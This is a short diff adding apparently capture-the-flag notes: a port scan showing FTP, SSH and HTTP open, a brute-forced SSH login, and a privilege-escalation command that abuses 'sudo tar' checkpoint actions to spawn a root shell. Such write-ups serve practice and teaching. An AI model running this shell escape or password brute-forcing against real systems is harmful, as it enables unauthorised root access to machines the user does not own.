@@ -1,0 +1,11 @@
+1 ~ Open ports
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+
+2 ~ Given password list and bruteforce ssh (Found password)
+
+3 ~ Login ssh, privesc ~ `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
